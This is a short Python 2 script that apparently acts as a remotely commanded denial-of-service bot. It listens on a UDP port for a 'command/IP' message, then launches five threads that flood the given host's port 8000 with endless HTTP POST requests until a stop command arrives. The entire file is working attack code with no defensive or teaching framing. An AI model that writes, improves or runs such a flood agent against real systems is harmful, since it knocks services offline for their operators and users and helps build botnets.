from socket import *
import requests
from threading import Thread

global Kill
Kill = False

def Post(url,attackedServerPort):
    parameters = {'dumb': 'dumb'}
    headers = {'keep_alive': 'True'}
    while not Kill:
        r = requests.post(url,data = parameters, headers=headers)
        print r.text



def Is_attack(msg):
    global Kill

    if (msg == 'S'):
        Kill = False
    elif (msg == 'B'):
        Kill = True

def attack(IP, attackedServerPort):
    channel1 = Thread(target= Post, args= [IP, attackedServerPort])
    channel2 = Thread(target= Post, args= [IP, attackedServerPort])
    channel3 = Thread(target= Post, args= [IP, attackedServerPort])
    channel4 = Thread(target= Post, args= [IP, attackedServerPort])
    channel5 = Thread(target= Post, args= [IP, attackedServerPort])


    channel1.start()
    channel2.start()
    channel3.start()
    channel4.start()
    channel5.start()




def listening():
    sentence = ''
    attackedServerPort = 8000
    serverPort = 12000
    serverSocket = socket(AF_INET, SOCK_DGRAM)
    hostName = gethostbyname('0.0.0.0')
    serverSocket.bind((hostName, serverPort))

    while not sentence:
        sentence, addr = serverSocket.recvfrom(1024)


    command = sentence.split('/')[0]
    IP = sentence.split('/')[1]

    IP = 'http://' + IP + ':' + str(attackedServerPort)

    attackThread = Thread(target=attack, args=[IP, attackedServerPort])
    attackThread.start()

    while 1:
        sentence, addr = serverSocket.recvfrom(1024)
        command = sentence.split('/')[0]
        Is_attack(command)


    serverSocket.close()


if __name__ == "__main__":

    listeningThread = Thread(target= listening)
    listeningThread.start()



